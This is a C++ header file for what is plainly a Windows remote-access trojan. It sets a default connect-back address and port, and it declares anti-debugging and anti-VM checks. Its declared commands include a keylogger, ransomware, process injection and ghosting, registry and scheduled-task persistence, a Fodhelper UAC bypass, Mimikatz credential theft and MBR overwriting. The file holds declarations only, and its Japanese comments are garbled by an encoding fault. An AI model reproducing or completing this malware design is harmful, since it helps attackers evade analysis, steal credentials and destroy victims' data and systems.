#pragma once


#include <map>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <string>
#include <iomanip>
#include <Winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <MSWSock.h>
#include <lmcons.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <set>
#include <thread>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <random>
#include "NtAPi.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")

struct Arg {
    char ipAddress[255] = "127.0.0.1";
    char portstr[255] = "4444";
    char antiDbg[255] = "Yes1";
    char antiVM[255] = "Yes2";
};

// �f�t�H���g�o�b�t�@
constexpr auto DEFAULT_BUFLEN = 4096;

extern SOCKET mainSocket;
extern std::set<std::string> helpOptions;
extern const std::string newline;

using CommandFunction = void(*)(std::vector<std::string>&);

// �A���`�f�o�b�O
void IsDebuggerPresentByAPI();
void NtGlobalFlagByPEB();
void CheckRemoteDebugger();
void WindowNameBlock();
void IsProcessRunning();
void AntiDbg();

// �A���`���z�}�V��
void CheckBIOS();
void CheckProcesses();
void CheckDrivers();
void CheckRegistry();
void AntiVM();

// �R�}���h���X�g
void Help(std::vector<std::string>& tokens);
void Netstat(std::vector<std::string>& tokens);
void Pwd(std::vector<std::string>& tokens);
void ProcessList(std::vector<std::string>& tokens);
void Copy(std::vector<std::string>& tokens);
void Move(std::vector<std::string>& tokens);
void Remove(std::vector<std::string>& tokens);
void Dir(std::vector<std::string>& tokens);
void Cat(std::vector<std::string>& tokens);
void Write(std::vector<std::string>& tokens);
void Touch(std::vector<std::string>& tokens);
void TerminateProcess(std::vector<std::string>& tokens);
void CreateNewProcess(std::vector<std::string>& tokens);
void ListProcessModule(std::vector<std::string>& tokens);
void RunPowerShellCommand(std::vector<std::string>& tokens);
void Cd(std::vector<std::string>& tokens);
void ScreenShot(std::vector<std::string>& tokens);
void UploadFile(std::vector<std::string>& tokens);
void DownloadFile(std::vector<std::string>& tokens);
void MkDir(std::vector<std::string>& tokens);
void Rmdir(std::vector<std::string>& tokens);
void KerLogger(std::vector<std::string>& tokens);
void TimedScreenshot(std::vector<std::string>& tokens);
void ShutDown(std::vector<std::string>& tokens);
void Reboot(std::vector<std::string>& tokens);
void Ransom(std::vector<std::string>& tokens);

// �����W�J
void Portscan(std::vector<std::string>& tokens);

// �y�C���[�h�ǂݍ��݃R�}���h
void DllLoad(std::vector<std::string>& tokens);

// �v���Z�X�C���W�F�N�V�����R�}���h
void DllInjection(std::vector<std::string>& tokens);
void ShellcodeInjection(std::vector<std::string>& tokens);
void AsyncProcedureCallDllInjection(std::vector<std::string>& tokens);
void FilelessTransactionHollowing(std::vector<std::string>& tokens);
void FilelessShellcodeInjection(std::vector<std::string>& tokens);
void FilelessReflectiveDLLInjection(std::vector<std::string>& tokens);
void TransactionHollowing(std::vector<std::string>& tokens);
void ProcessGhosting(std::vector<std::string>& tokens);

// ���������J�j�Y��
void RunRegistry(std::vector<std::string>& tokens);
void TaskSchedule(std::vector<std::string>& tokens);
void CreateShortcutInStartup(std::vector<std::string>& tokens);

// �G�N�X�v���C�g
void FodhelperUacBypass(std::vector<std::string>& tokens);
void KDMapper(std::vector<std::string>& tokens);
void Mimikatz(std::vector<std::string>& tokens);

// ���̑��R�}���h
void ShowMessageBox(std::vector<std::string>& tokens);
void SystemCrash(std::vector<std::string>& tokens);
void GdiEffect(std::vector<std::string>& tokens);
void TerminateCriticalProcess(std::vector<std::string>& tokens);

void OverWriteMBR(std::vector<std::string>& tokens);

// ���̑��֐�
std::wstring ConvertToWString(const std::string& str);
void SendString(const std::string& message);
std::vector<std::string> ParseCommand(const std::string& input);
void ExecuteCommand(std::vector<std::string>& tokens);
void SendPrompt(SOCKET mainSocket);
std::string generateRandomFileName();